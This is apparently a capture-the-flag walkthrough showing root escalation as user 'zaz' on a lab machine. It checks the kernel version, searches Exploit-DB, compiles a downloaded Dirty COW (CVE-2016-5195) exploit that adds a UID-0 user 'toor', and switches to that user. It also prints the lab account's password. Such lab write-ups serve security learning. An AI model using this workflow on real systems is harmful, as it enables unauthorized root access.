# Privilege Escalation — Dirty COW

We connect to `zaz`. No need to demonstrate how we got access, as it was already explained in the first write-up.

**zaz's password:** `646da671ca01bb5d84dbb5fb2238dc8e`

## Kernel Enumeration

We check the kernel version:

```bash
uname -r
```

**Output:**
```text
3.2.0-91-generic-pae
```

## Searching for an Exploit

We search for an exploit using **Exploit-DB**.

First, we clone the repository:

```bash
git clone https://gitlab.com/exploit-database/exploitdb.git
```

Then, we use SearchSploit:

```bash
./searchsploit linux kernel 3.2.0-91
```

We notice a recurring exploit in the results: **Dirty COW (CVE-2016-5195)**.

## Exploitation

We find several scripts online that exploit this vulnerability.

We choose one from GitHub and compile it using:

```bash
gcc -pthread cow.c -o dirty_cow -lcrypt
```

This exploit creates a new user named `toor` with root privileges (UID 0) and a password we specify.

After running the exploit, we switch to the new user:

```bash
su toor
```

We enter the password we previously specified.

To verify our privileges:

```bash
whoami
```

**Output:**
```text
root
```

**We are root!**